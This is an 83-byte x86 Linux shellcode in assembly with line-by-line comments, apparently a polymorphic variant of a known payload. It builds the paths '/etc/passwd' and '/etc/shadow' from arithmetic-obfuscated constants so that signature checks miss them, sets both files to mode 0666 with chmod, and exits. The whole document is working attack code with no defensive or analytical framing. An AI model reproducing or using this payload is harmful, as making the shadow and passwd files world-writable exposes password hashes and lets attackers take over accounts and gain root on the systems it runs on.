;Shellcode size : 83 bytes (40% more)
global _start

_start:
    xor eax, eax                        ;Initialize eax to NULL
    mov cx, 0x1b6                       ;Move 0x1b6 inside cx (666 in octal)
 
    push eax                            ;Push a NULL byte on the stack
    push 0x64777373                     ;Push 0x64777373 on the stack
    mov edi, 0x2e3cfbfc                 ;Move 0x2e3cfbfc inside edi
    add edi, 0x33333333                 ;Add 0x33333333 to edi
    push edi                            ;Push 0x61702F2F on the stack
    mov edi, 0x63746541                 ;Move 0x63746541 inside edi
    sub edi, 0x12                       ;Subsract 0x12 to edi
    push edi                            ;Push "/etc//passwd%00" on the stack
    mov ebx, esp                        ;Initialize ebx to the esp stack pointer

    push 0xf                            ;Push the chmod systemcall number on the stack
    pop eax                             ;Move the systemcall number inside eax
    ;Systemcall details:
    ; --> chmod("/etc/passwd%00", 0666o)
    int 0x80                            ;Execute systemcall

    push 0x1                            ;Push 0x1 on the stack
    pop eax                             ;Pop 0x1 on the syack
    dec eax                             ;Initialize eax to NULL
    push eax                            ;Push a NULL byte on the stack

    mov edi, 0x443C312E                 ;Move 0x443C312E inside edi
    add edi, 0x33333333                 ;Add 0x33333333 to 0x443C312E
    push edi                            ;Push 0x776F6461 on the stack
    push 0x68732f2f                     
    push 0x6374652f                     ;Push "/etc//shadow%00" on the stack        
    mov ebx, esp                        ;Initialize ebx to the esp stack pointer
    
    mov dl, 0xf                         ;Push the chmod systemcall number on the stack
    xchg al, dl                         ;Move the systemcall number inside eax

    ;Systemcall details:
    ; --> chmod("/etc/shadow%00", 0666o)
    int 0x80                            ;Execute systemcall


    push 0x1                            ;Push the exit systemcall number on the stack
    pop eax                             ;move the systemcall number inside eax
    mov ebx, eax
    dec ebx                             ;Initialize ebx to 0
    ;Systemcall details:
    ; --> exit(0)
    int 0x80                            ;Execute systemcall